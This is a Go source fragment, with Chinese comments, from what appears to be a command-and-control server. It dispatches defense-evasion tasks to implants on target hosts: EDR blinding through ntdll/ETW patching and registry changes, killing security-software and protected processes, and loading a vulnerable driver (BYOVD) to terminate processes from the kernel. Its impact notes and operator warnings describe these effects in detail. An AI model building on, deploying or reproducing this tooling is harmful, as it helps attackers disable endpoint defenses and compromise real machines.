		// 这里用任务表里登记的任务类型创建，Data 为空对象（植入端 detectSecurityProducts 不读参数）。
		return s.taskMgr.Create(id, task.TaskParams{TaskType: a.TaskType, Data: `{}`})

	case "edr_blind":
		return s.taskMgr.CreateEDRBlind(id)

	case "edr_kill":
		return s.taskMgr.CreateEDRKill(id, avops.ParamStringSlice(params, "processes"))

	case "process_kill":
		pid, ok := avops.ParamUint32(params, "pid")
		if !ok {
			return nil, avops.NewError(400, avops.CodeParamsInvalid,
				"params.pid 必须是 1..4294967295 的整数（PID 会复用，请先用 process_list 确认）")
		}
		return s.taskMgr.CreateProcessKill(id, pid)

	case "byovd_load":
		return s.taskMgr.CreateBYOVDLoad(id,
			avops.ParamString(params, "driver_b64"),
			avops.ParamString(params, "service_name"),
			avops.ParamString(params, "device_name"))

	case "byovd_unload":
		return s.taskMgr.CreateBYOVDUnload(id, avops.ParamString(params, "service_name"))

	case "byovd_kill":
		pid, _ := avops.ParamUint32(params, "pid")
		name := avops.ParamString(params, "process_name")
		if pid == 0 && name == "" {
			return nil, avops.NewError(400, avops.CodeParamsInvalid,
				"params 需要 pid 或 process_name 至少一个（植入端按进程名走 Toolhelp32 快照解析，匹配不到会失败）")
		}
		if plan.Device == "" || plan.IOCTL == 0 {
			return nil, avops.NewError(500, avops.CodeDriverUnavailable,
				"内部错误：L3 驱动前置检查通过但没有解析出 device/ioctl")
		}
		return s.taskMgr.CreateBYOVDKill(id, pid, name, plan.Device, plan.IOCTL)

	case "ppl_kill":
		return s.taskMgr.CreatePPLKill(id, avops.ParamStringSlice(params, "processes"))
	}
	// 分级表里有、下发实现里没有 = 表与实现漂移。fail-closed：拒绝，绝不"猜个任务类型发出去"。
	return nil, avops.NewError(500, avops.CodeUnknownAction,
		"动作 %s 在分级表里登记了，但没有对应的下发实现（表与实现漂移）：已拒绝下发（fail-closed）。"+
			"请检查 handlers_avops.go 的 avopsDispatch 是否漏了这个动作", a.Name)
}

// avopsImpactOf 组装**如实**的影响评估。
//
// 要求是"不得夸大或粉饰"：这里只做"把已知事实填进结构化字段"，不写"影响很小/很安全"之类
// 无法验证的话。动作本身会造成什么，一律取自动作表的 Impact（逐条与植入端实现核对过）。
func avopsImpactOf(a avops.Action, params map[string]interface{}, plan avopsDriverPlan, timeoutSec int) map[string]interface{} {
	impact := map[string]interface{}{
		"destructive": a.Destructive,
		"auto_retry":  a.AutoRetry,
		// reversible：是否有"点一下就回滚"的路径。L1 起都没有（注册表改动/被杀进程/
		// 已加载的驱动都不会自动恢复），因此这里如实写 false，而不是写"可卸载即无害"。
		"reversible":  !a.Destructive,
		"summary":     a.Impact,
		"timeout_sec": timeoutSec,
	}
	if targets := avopsTargetsOf(a, params, plan); targets != "" {
		impact["targets"] = targets
	}
	if a.Destructive {
		impact["irreversible_note"] = "该动作造成的改动不会自动回滚：结束后不会自动恢复、注册表改动不会自动还原、" +
			"已加载的驱动不会自动卸载；且服务端**不会**自动重投递这条任务（超时/丢结果都算这一次）。"
	}
	return impact
}

// avopsTargetsOf 把"这次到底会动什么"写清楚（尽量给出具体目标，而不是笼统描述）。
func avopsTargetsOf(a avops.Action, params map[string]interface{}, plan avopsDriverPlan) string {
	switch a.Name {
	case "av_detect":
		return "目标会话所在主机：只做一次进程枚举（不改动任何对象）"
	case "edr_blind":
		return "目标会话进程自身（ntdll .text / ETW 写入函数）+ 目标机的 ETW Autologger 注册表项"
	case "edr_kill":
		if names := avops.ParamStringSlice(params, "processes"); len(names) > 0 {
			return fmt.Sprintf("按进程名结束 %d 个目标：%s", len(names), strings.Join(names, ", "))
		}
		// 内置清单的实际命中数取决于目标机运行了哪些产品 —— 不编一个确定数字出来。
		return "未指定 processes：使用植入端内置的安全软件进程名清单（当前 36 项），" +
			"实际会被结束的进程数取决于目标机当时运行了哪些产品，服务端无法预先给出确定数字"
	case "process_kill":
		if pid, ok := avops.ParamUint32(params, "pid"); ok {
			return fmt.Sprintf("结束目标机上 PID=%d 的进程（PID 会复用，请确认这是预期目标）", pid)
		}
		return "结束目标机上指定 PID 的进程"
	case "byovd_load":
		return fmt.Sprintf("目标机内核：写入并加载驱动服务 %s（%s）",
			avops.ParamString(params, "service_name"), plan.Detail)
	case "byovd_unload":
		return fmt.Sprintf("目标机内核：停止并删除驱动服务 %s 及其 .sys 文件（文件删除不可恢复）",
			avops.ParamString(params, "service_name"))
	case "byovd_kill":
		t := avops.ParamString(params, "process_name")
		if pid, ok := avops.ParamUint32(params, "pid"); ok {
			t = fmt.Sprintf("PID=%d", pid)
		}
		return fmt.Sprintf("通过驱动终止进程 %s（%s）", t, plan.Detail)
	case "ppl_kill":
		if names := avops.ParamStringSlice(params, "processes"); len(names) > 0 {
			return fmt.Sprintf("结束 %d 个受保护/安全软件进程：%s（%s）", len(names), strings.Join(names, ", "), plan.Detail)
		}
		return "结束默认清单里的受保护/安全软件进程（" + plan.Detail + "）"
	}
	return ""
}

// avopsWarnings 组装警告（不阻断下发，但必须让操作员看见）。
func avopsWarnings(a avops.Action, st *avopsSessionState, p avops.Policy) []string {
	var out []string
	if a.Destructive {
		out = append(out, "破坏性任务**不会自动重试**：超时或结果丢失后服务端不会自动重新投递"+
			"（重发 = 再执行）。需要重试请先确认目标机现状，再重新下发（会分配新的 task_id）。")
	}
	switch a.Tier {
	case avops.TierL1:
		out = append(out, "ETW Autologger 注册表改动是系统级的、不会自动恢复；"+
			"ntdll/ETW 的内存 patch 只影响该会话进程自身。可能触发主动防御告警。")
	case avops.TierL2:
		out = append(out, "将强制结束进程：目标机可能因此不稳定或重启，且安全软件的自保护可能立刻拉回。"+
			"请在授权范围内、并确认目标不是当前会话自身或运维通道。")
	case avops.TierL3:
		out = append(out, "驱动由操作员自备、项目不内置：请自行确认来源、签名与授权。"+
			"哈希/签名自检见 GET /api/v1/drivers/{name}/verify；内核代码完整性策略（HVCI 等）会静默拒绝加载。")
	}
	if a.NeedsConfirm && p.SkipConfirm {
		out = append(out, "注意：服务端配置已关闭强制二次确认（avops.require_confirm=false），"+
			"本次下发没有强校验 confirm —— 这是放宽项，建议改回 true。")
	}
	if st != nil && st.Source == features.SourceOSFallback {
		out = append(out, "该会话没有上报能力位：本次能力清单按 OS 兜底推导，未必等于载荷真实能力"+
			"（判定通过后仍可能拿到「未包含在本次构建中」）。")
	}
	return out
}

// writeAVOpsError 输出带机器可读 code 的失败响应（含已完成的步骤清单）。
func writeAVOpsError(w http.ResponseWriter, err error, checks []avopsCheck) {
	if checks == nil {
		checks = []avopsCheck{}
	}
	w.WriteHeader(avops.ErrorHTTP(err, http.StatusInternalServerError))
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"ok":     false,
		"code":   avops.ErrorCode(err),
		"error":  avops.ErrorMessage(err),
		"checks": checks,
	})
}
